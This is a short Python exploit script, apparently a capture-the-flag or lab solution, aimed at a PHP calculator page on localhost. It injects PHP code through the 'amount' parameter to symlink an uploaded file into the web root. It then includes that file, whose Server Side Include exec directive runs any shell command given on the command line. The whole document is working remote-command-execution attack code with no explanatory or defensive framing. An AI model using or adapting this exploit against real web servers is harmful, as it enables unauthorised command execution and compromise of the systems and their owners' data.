import requests
import sys
from io import StringIO
from urllib.parse import quote_plus


def main():
    host = 'localhost:5000'
    cmd = sys.argv[1]
    ssi_payload = StringIO(f'<!--#exec cmd="{cmd}"-->')
    param_payload = ".ini_set('display_errors', 1).symlink($_FILES['file']['tmp_name'], '/var/www/html/file.shtml').virtual('file.shtml').die()."
    r = requests.post(f'http://{host}/calc.php?amount="{quote_plus(param_payload)}"', files={'file': ssi_payload}).text
    print(r)


if __name__ == '__main__':
    main()
